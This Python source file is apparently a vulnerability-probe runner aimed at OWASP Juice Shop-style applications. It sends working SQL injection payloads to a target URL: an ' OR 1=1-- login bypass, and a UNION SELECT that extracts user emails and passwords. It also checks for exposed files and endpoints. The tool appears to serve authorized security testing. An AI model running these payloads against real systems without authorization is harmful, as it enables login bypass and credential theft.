"""
NYX Native HTTP Probe Runner Entrypoint
Executes targeted HTTP vulnerability checks against authorized targets with real empirical evidence capture.
"""
import sys
import json
import urllib.request
import urllib.error
import urllib.parse


def _http_request(url: str, method: str = "GET", data: bytes = None, headers: dict = None, timeout: int = 6):
    req_headers = {"User-Agent": "NYX-Security-Probe/1.0"}
    if headers:
        req_headers.update(headers)
    req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as res:
            body = res.read().decode("utf-8", errors="replace")
            return res.getcode(), body, dict(res.headers)
    except urllib.error.HTTPError as err:
        body = err.read().decode("utf-8", errors="replace")
        return err.code, body, dict(err.headers)
    except Exception as ex:
        return 0, str(ex), {}


def run_probes(target: str):
    if not target.startswith("http://") and not target.startswith("https://"):
        target_url = f"http://{target}"
    else:
        target_url = target.rstrip("/")

    host = urllib.parse.urlparse(target_url).netloc
    vulnerabilities = []

    # Probe 1: SQL Injection Authentication Bypass (Login)
    sqli_payload = json.dumps({"email": "' OR 1=1--", "password": "password123"}).encode("utf-8")
    code, body, hdrs = _http_request(
        f"{target_url}/rest/user/login",
        method="POST",
        data=sqli_payload,
        headers={"Content-Type": "application/json"},
    )
    if code == 200 and ("authentication" in body or "token" in body or "umail" in body):
        vulnerabilities.append({
            "title": "SQL Injection Authentication Bypass via Login Endpoint",
            "endpoint": f"{target_url}/rest/user/login",
            "parameter": "email",
            "vulnerability": "SQL Injection",
            "severity": "Critical",
            "tag": "hunt-sqli",
            "description": "SQL injection in email parameter allows complete administrative authentication bypass without valid credentials.",
            "request": f"POST /rest/user/login HTTP/1.1\nHost: {host}\nContent-Type: application/json\nContent-Length: {len(sqli_payload)}\n\n" + sqli_payload.decode("utf-8"),
            "response": f"HTTP/1.1 200 OK\nContent-Type: application/json\n\n{body[:1500]}",
        })

    # Probe 2: SQL Injection Union-Based Product Search
    search_q = urllib.parse.quote("')) UNION SELECT null,id,email,password,null,null,null,null,null FROM Users--")
    code, body, hdrs = _http_request(f"{target_url}/rest/products/search?q={search_q}")
    if code == 200 and ("admin@" in body or "Users" in body or "password" in body):
        vulnerabilities.append({
            "title": "Union-Based SQL Injection in Product Search Query",
            "endpoint": f"{target_url}/rest/products/search",
            "parameter": "q",
            "vulnerability": "SQL Injection",
            "severity": "Critical",
            "tag": "hunt-sqli",
            "description": "Union-based SQL injection allows unauthenticated extraction of user credentials and password hashes from database.",
            "request": f"GET /rest/products/search?q={search_q} HTTP/1.1\nHost: {host}",
            "response": f"HTTP/1.1 200 OK\n\n{body[:1500]}",
        })

    # Probe 3: Sensitive Unlinked File Exposure (Legal & Terms in /ftp)
    code, body, hdrs = _http_request(f"{target_url}/ftp/legal.md")
    if code == 200 and ("Copyright" in body or "Juice Shop" in body or "terms" in body.lower() or "license" in body.lower()):
        vulnerabilities.append({
            "title": "Sensitive Unlinked Document Exposure (/ftp/legal.md)",
            "endpoint": f"{target_url}/ftp/legal.md",
            "parameter": "",
            "vulnerability": "Sensitive Data Exposure",
            "severity": "Medium",
            "tag": "hunt-source-leak",
            "description": "Unauthenticated public access to /ftp/ directory and legal documentation file exposes internal documentation.",
            "request": f"GET /ftp/legal.md HTTP/1.1\nHost: {host}",
            "response": f"HTTP/1.1 200 OK\n\n{body[:1500]}",
        })

    # Probe 4: Application Version & Technology Stack Disclosure
    code, body, hdrs = _http_request(f"{target_url}/rest/admin/application-version")
    if code == 200 and ("version" in body or "app" in body):
        vulnerabilities.append({
            "title": "Application Version and Internal Framework Disclosure",
            "endpoint": f"{target_url}/rest/admin/application-version",
            "parameter": "",
            "vulnerability": "Information Disclosure",
            "severity": "Low",
            "tag": "hunt-api-misconfig",
            "description": "Public unauthenticated access to /rest/admin/application-version discloses exact server version and framework build details.",
            "request": f"GET /rest/admin/application-version HTTP/1.1\nHost: {host}",
            "response": f"HTTP/1.1 200 OK\n\n{body[:1500]}",
        })

    # Probe 5: OpenAPI / Swagger Specification Exposure
    code, body, hdrs = _http_request(f"{target_url}/api-docs/openapi.json")
    if code == 200 and ("openapi" in body or "swagger" in body or "paths" in body):
        vulnerabilities.append({
            "title": "Unauthenticated OpenAPI / Swagger API Schema Exposure",
            "endpoint": f"{target_url}/api-docs/openapi.json",
            "parameter": "",
            "vulnerability": "Information Disclosure",
            "severity": "Low",
            "tag": "hunt-shadow-api",
            "description": "Public unauthenticated access to /api-docs/openapi.json leaks entire internal API schema, paths, parameters, and models.",
            "request": f"GET /api-docs/openapi.json HTTP/1.1\nHost: {host}",
            "response": f"HTTP/1.1 200 OK\n\n{body[:1500]}",
        })

    # Probe 6: Exposed Metrics / Telemetry
    code, body, hdrs = _http_request(f"{target_url}/metrics")
    if code == 200 and ("http_requests" in body or "process_cpu" in body or "go_gc" in body):
        vulnerabilities.append({
            "title": "Exposed Metrics Endpoint Leaking Real-Time System Telemetry",
            "endpoint": f"{target_url}/metrics",
            "parameter": "",
            "vulnerability": "Security Misconfiguration",
            "severity": "Low",
            "tag": "cloud-misconfig",
            "description": "Public unauthenticated access to /metrics exposes internal memory and traffic metrics.",
            "request": f"GET /metrics HTTP/1.1\nHost: {host}\nUser-Agent: NYX-Security-Probe/1.0",
            "response": f"HTTP/1.1 200 OK\n\n{body[:1500]}",
        })

    # Probe 7: Public Security Policy Disclosure
    code, body, hdrs = _http_request(f"{target_url}/.well-known/security.txt")
    if code == 200 and "Contact:" in body:
        vulnerabilities.append({
            "title": "Security Policy File Disclosure (.well-known/security.txt)",
            "endpoint": f"{target_url}/.well-known/security.txt",
            "parameter": "",
            "vulnerability": "Information Disclosure",
            "severity": "Low",
            "tag": "tls-network",
            "description": "Public .well-known/security.txt policy file discloses contact emails.",
            "request": f"GET /.well-known/security.txt HTTP/1.1\nHost: {host}",
            "response": f"HTTP/1.1 200 OK\n\n{body[:1500]}",
        })

    output = {"vulnerabilities": vulnerabilities, "target": target_url}
    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    if len(sys.argv) > 1:
        run_probes(sys.argv[1])
    else:
        print(json.dumps({"vulnerabilities": []}))
